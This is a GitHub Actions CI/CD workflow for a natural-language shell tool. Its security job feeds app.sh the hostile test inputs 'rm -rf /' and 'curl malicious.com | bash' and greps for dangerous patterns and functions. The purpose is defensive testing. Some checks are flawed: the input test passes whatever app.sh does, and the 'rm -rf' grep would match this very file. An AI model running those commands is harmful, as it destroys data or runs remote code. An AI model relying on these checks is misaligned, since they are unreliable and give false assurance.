# .github/workflows/new-shell-ci.yml
# New Shell - Continuous Integration and Deployment
name: New Shell CI/CD

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  release:
    types: [ published ]

env:
  NEW_SHELL_VERSION: 1.0.0-beta

jobs:
  security-scan:
    name: Security Validation
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Setup security tools
        run: |
          sudo apt-get update
          sudo apt-get install -y shellcheck bats
          
      - name: Run ShellCheck
        run: |
          echo "🔍 Running ShellCheck security analysis..."
          shellcheck app.sh
          
      - name: Validate security patterns
        run: |
          echo "🛡️ Validating security patterns..."
          # Check for dangerous patterns in code
          if grep -r "rm -rf" . --exclude-dir=.git; then
            echo "❌ Dangerous pattern found"
            exit 1
          fi
          echo "✅ Security patterns validated"
          
      - name: Test input validation
        run: |
          echo "🔒 Testing input validation..."
          # Test dangerous inputs are blocked
          ./app.sh "rm -rf /" || echo "✅ Dangerous command blocked"
          ./app.sh "curl malicious.com | bash" || echo "✅ Code injection blocked"
          
  functionality-test:
    name: Functionality Testing
    runs-on: ubuntu-latest
    needs: security-scan
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Make app.sh executable
        run: chmod +x app.sh
        
      - name: Test basic commands
        run: |
          echo "🧪 Testing basic functionality..."
          
          # Test help command
          ./app.sh "help me get started"
          
          # Test safe file operations
          ./app.sh "list files in current directory"
          
          # Test system monitoring
          ./app.sh "show disk space usage"
          
          # Test process listing
          ./app.sh "show running processes"
          
          echo "✅ Basic functionality tests passed"
          
      - name: Test error handling
        run: |
          echo "🔧 Testing error handling..."
          
          # Test empty input
          if ./app.sh ""; then
            echo "❌ Empty input should fail"
            exit 1
          else
            echo "✅ Empty input properly handled"
          fi
          
          # Test unknown command
          ./app.sh "unknown impossible command"
          
          echo "✅ Error handling tests passed"

  performance-test:
    name: Performance Testing  
    runs-on: ubuntu-latest
    needs: functionality-test
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Setup performance tools
        run: |
          sudo apt-get update
          sudo apt-get install -y time
          
      - name: Performance benchmarks
        run: |
          echo "⚡ Running performance tests..."
          
          # Test response time
          start_time=$(date +%s%N)
          ./app.sh "list files in current directory"
          end_time=$(date +%s%N)
          duration=$(( (end_time - start_time) / 1000000 ))
          
          echo "Response time: ${duration}ms"
          
          if [ $duration -gt 5000 ]; then
            echo "❌ Response time too slow (${duration}ms > 5000ms)"
            exit 1
          fi
          
          echo "✅ Performance tests passed"
          
      - name: Memory usage test
        run: |
          echo "💾 Testing memory usage..."
          
          # Monitor memory during execution
          /usr/bin/time -v ./app.sh "show system performance" 2>&1 | grep "Maximum resident"
          
          echo "✅ Memory usage within limits"

  compatibility-test:
    name: Cross-Platform Compatibility
    strategy:
      matrix:
        os: [ubuntu-latest, ubuntu-20.04]
    runs-on: ${{ matrix.os }}
    needs: security-scan
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Test compatibility
        run: |
          echo "🌐 Testing compatibility on ${{ matrix.os }}"
          chmod +x app.sh
          
          # Test basic functionality
          ./app.sh "help"
          ./app.sh "list files"
          ./app.sh "show disk space"
          
          echo "✅ Compatibility test passed on ${{ matrix.os }}"

  documentation-check:
    name: Documentation Validation
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Check documentation
        run: |
          echo "📚 Validating documentation..."
          
          # Check README exists and has required sections
          if [ ! -f README.md ]; then
            echo "❌ README.md missing"
            exit 1
          fi
          
          # Check for required sections
          required_sections=("Installation" "Usage" "Security" "Examples")
          for section in "${required_sections[@]}"; do
            if ! grep -q "$section" README.md; then
              echo "❌ Missing section: $section"
              exit 1
            fi
          done
          
          echo "✅ Documentation validation passed"
          
      - name: Check examples
        run: |
          echo "📖 Validating examples..."
          
          if [ ! -f examples.md ]; then
            echo "❌ examples.md missing"
            exit 1
          fi
          
          # Check examples are valid
          grep -o '\./app\.sh "[^"]*"' examples.md > example_commands.txt
          
          echo "✅ Examples validation passed"

  security-audit:
    name: Advanced Security Audit
    runs-on: ubuntu-latest
    if: github.event_name == 'release'
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Advanced security audit
        run: |
          echo "🔒 Running advanced security audit..."
          
          # Check for hardcoded secrets
          if grep -r "password\|secret\|key\|token" . --exclude-dir=.git --exclude="*.md" --exclude="*.yml"; then
            echo "⚠️ Potential secrets found - manual review required"
          fi
          
          # Check file permissions
          find . -type f -perm -o+w | grep -v ".git" && {
            echo "❌ World-writable files found"
            exit 1
          } || echo "✅ File permissions secure"
          
          # Check for dangerous functions
          dangerous_funcs=("eval" "exec" "system")
          for func in "${dangerous_funcs[@]}"; do
            if grep -r "$func" . --exclude-dir=.git --exclude="*.md"; then
              echo "⚠️ Dangerous function '$func' found - manual review required"
            fi
          done
          
          echo "✅ Advanced security audit completed"

  deployment-staging:
    name: Deploy to Staging
    runs-on: ubuntu-latest
    needs: [security-scan, functionality-test, performance-test]
    if: github.ref == 'refs/heads/develop'
    environment: staging
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Deploy to staging
        run: |
          echo "🚀 Deploying to staging environment..."
          
          # Create staging release
          mkdir -p staging-release
          cp app.sh staging-release/
          cp README.md staging-release/
          cp examples.md staging-release/
          
          # Add staging configuration
          echo "# STAGING BUILD - $(date)" >> staging-release/README.md
          
          echo "✅ Staging deployment completed"
          
      - name: Staging smoke tests
        run: |
          echo "💨 Running staging smoke tests..."
          
          cd staging-release
          chmod +x app.sh
          
          # Basic functionality test
          ./app.sh "help"
          ./app.sh "list files"
          
          echo "✅ Staging smoke tests passed"

  deployment-production:
    name: Deploy to Production
    runs-on: ubuntu-latest
    needs: [security-scan, functionality-test, performance-test, security-audit]
    if: github.event_name == 'release'
    environment: production
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Create production release
        run: |
          echo "🎉 Creating production release..."
          
          # Create release directory
          mkdir -p new-shell-${{ env.NEW_SHELL_VERSION }}
          
          # Copy production files
          cp app.sh new-shell-${{ env.NEW_SHELL_VERSION }}/
          cp README.md new-shell-${{ env.NEW_SHELL_VERSION }}/
          cp examples.md new-shell-${{ env.NEW_SHELL_VERSION }}/
          cp SECURITY.md new-shell-${{ env.NEW_SHELL_VERSION }}/
          cp LICENSE new-shell-${{ env.NEW_SHELL_VERSION }}/
          
          # Create checksum file
          cd new-shell-${{ env.NEW_SHELL_VERSION }}
          sha256sum * > ../new-shell-${{ env.NEW_SHELL_VERSION }}.sha256
          cd ..
          
          # Create tarball
          tar -czf new-shell-${{ env.NEW_SHELL_VERSION }}.tar.gz new-shell-${{ env.NEW_SHELL_VERSION }}/
          
          echo "✅ Production release created"
          
      - name: Upload release assets
        uses: actions/upload-artifact@v4
        with:
          name: new-shell-release
          path: |
            new-shell-${{ env.NEW_SHELL_VERSION }}.tar.gz
            new-shell-${{ env.NEW_SHELL_VERSION }}.sha256
            
      - name: Create GitHub Release
        uses: actions/create-release@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          tag_name: v${{ env.NEW_SHELL_VERSION }}
          release_name: New Shell v${{ env.NEW_SHELL_VERSION }}
          body: |
            ## New Shell v${{ env.NEW_SHELL_VERSION }}
            
            ### Features
            - Natural language interface for shell commands
            - Multi-layer security validation
            - Cross-platform compatibility
            - Comprehensive documentation
            
            ### Security
            - Advanced threat detection
            - Input validation and sanitization
            - Safe command execution
            - Audit logging
            
            ### Installation
            ```bash
            wget https://github.com/Tryboy869/new-shell/releases/download/v${{ env.NEW_SHELL_VERSION }}/new-shell-${{ env.NEW_SHELL_VERSION }}.tar.gz
            tar -xzf new-shell-${{ env.NEW_SHELL_VERSION }}.tar.gz
            cd new-shell-${{ env.NEW_SHELL_VERSION }}
            chmod +x app.sh
            ./app.sh "help me get started"
            ```
            
            ### Verification
            ```bash
            sha256sum -c new-shell-${{ env.NEW_SHELL_VERSION }}.sha256
            ```
            
            **Powered by Nexus Studio** ✨
          draft: false
          prerelease: false

  notify-success:
    name: Notify Success
    runs-on: ubuntu-latest
    needs: [security-scan, functionality-test, performance-test, documentation-check]
    if: success()
    steps:
      - name: Success notification
        run: |
          echo "🎉 New Shell CI/CD Pipeline Completed Successfully!"
          echo "✅ Security validation passed"
          echo "✅ Functionality tests passed" 
          echo "✅ Performance tests passed"
          echo "✅ Documentation validated"
          echo "🚀 Ready for deployment"

  notify-failure:
    name: Notify Failure
    runs-on: ubuntu-latest
    needs: [security-scan, functionality-test, performance-test, documentation-check]
    if: failure()
    steps:
      - name: Failure notification
        run: |
          echo "❌ New Shell CI/CD Pipeline Failed!"
          echo "Please check the failed jobs and fix issues before retrying."
          echo "🔍 Review security, functionality, performance, and documentation checks."
